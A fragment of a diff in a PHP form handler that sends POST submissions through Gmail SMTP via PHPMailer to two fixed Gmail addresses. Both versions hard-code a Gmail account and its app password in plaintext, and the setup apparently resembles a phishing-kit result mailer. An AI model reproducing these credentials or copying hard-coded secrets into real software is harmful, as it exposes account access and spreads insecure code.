@@ -22,20 +22,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // PHPMailer object creation
     $mail = new PHPMailer(true);
 
-    try {
+   try {
         // SMTP settings
           $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'best90960@gmail.com'; // Replace with your email address
-        $mail->Password   = 'kqnv nxov jjek btps'; // Replace with your email password
+        $mail->Username   = 'dardhame1@gmail.com'; // Replace with your email address
+        $mail->Password   = 'vbbx qrsx uvpo plzl'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
-       
         // Email properties
-        $mail->setFrom('best90960@gmail.com', 'PROFESSOR');
+        $mail->setFrom('dardhame1@gmail.com', 'PROFESSOR');
         $mail->addAddress('ellonsmith75@gmail.com');
          $mail->addAddress('my.heart.my.jan.my.live@gmail.com');
       // Email recipient's address
